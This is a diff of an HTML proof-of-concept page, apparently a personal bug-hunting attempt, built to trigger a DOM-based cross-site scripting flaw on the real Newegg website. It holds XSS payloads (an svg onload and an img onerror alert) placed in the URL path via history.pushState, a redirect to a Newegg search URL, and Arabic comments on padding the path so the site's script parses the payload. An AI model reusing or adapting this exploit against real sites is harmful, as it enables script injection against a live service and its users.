@@ -2,28 +2,27 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Final PoC - Mouad</title>
+    <title>PoC Mouad</title>
 </head>
 <body style="background:#000; color:#fff; text-align:center; padding-top:100px;">
 
-    <div style="border:2px solid #00ff00; display:inline-block; padding:30px;">
-        <h2 style="color:#00ff00;">DOM XSS Bypass Lab</h2>
-        <button id="go" style="padding:10px 20px; cursor:pointer;">اضغط لتشغيل الهجوم 🚀</button>
-    </div>
+    <h1 style="color:red;">Newegg DOM XSS Lab</h1>
+    <button id="attack" style="padding:20px; font-size:20px; cursor:pointer;">اضغط لتشغيل الهجوم 🚀</button>
 
     <script>
-        // بايلود بدون علامة / لكي لا يكسر الـ split
-        // استخدمنا وسم <img> لأنه يعمل فوراً عند الفشل
-        var payload = '"><img src=x onerror=alert(document.domain)>';
-        
-        // هنا السر: أضفنا / إضافية لضمان أن البايلود يقع في split("/")[3]
-        // الرابط سيكون: domain.com / VORTEX / [Payload] /
-        var attackPath = "/VORTEX/" + payload;
+        // هذا البايلود هو بالضبط ما نجح معك في الكونسول
+        // قمنا بإزالة المسافات لضمان عدم كسر الرابط
+        var payload = '"><svg/onload=alert(1)><b/style="color:red">HACKED';
 
-        // تنفيذ التغيير
+        // السر هنا: يجب أن يكون الرابط طويلاً بما يكفي لكي لا ينهار سكريبت Newegg
+        // سنضع البايلود في الجزء الثالث والرابع
+        var attackPath = "/VORTEX/test/" + payload;
+
+        // تحديث عنوان الصفحة الحالي
         window.history.pushState({}, '', attackPath);
 
-        document.getElementById('go').onclick = function() {
+        document.getElementById('attack').onclick = function() {
+            // التوجه لصفحة Newegg التي تحتوي على السكريبت المصاب
             window.location.href = "https://www.newegg.com/p/pl?d=Yasser&GroupEss209183=Mouad";
         };
     </script>
